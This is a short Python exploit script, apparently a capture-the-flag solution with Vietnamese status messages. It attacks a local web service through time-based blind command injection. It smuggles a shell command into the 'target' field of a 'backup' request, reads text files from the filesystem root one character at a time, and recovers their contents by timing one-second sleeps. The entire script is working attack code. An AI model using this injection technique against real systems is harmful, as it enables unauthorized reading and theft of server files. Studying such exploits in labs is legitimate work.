import requests
import time
char = "123456789_.}{qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM"
flag = ""
for j in range(1,  20):
    for c in char:
        url = "http://localhost:3007"
        data = {
            "command": "backup",
            "target": f"facebook --help;ket_qua=$(cat /*.txt | cut -c{j}) ;if [ \"$ket_qua\" = \"{c}\" ]; then sleep 1 ;else sleep 0;fi #"
        }
        print(f"Dang kiem tra ki tu thu {j}, Ki tu dang kiem tra la {c}. Ket qua tim duoc la : {flag}", end="\r" ,)
        start = time.time()
        response = requests.post(url=url, data=data)
        end = time.time()
        if round(end - start) == 1:
            flag += c
print("                                                                        ")
print(f"Ket qua tim duoc la {flag}")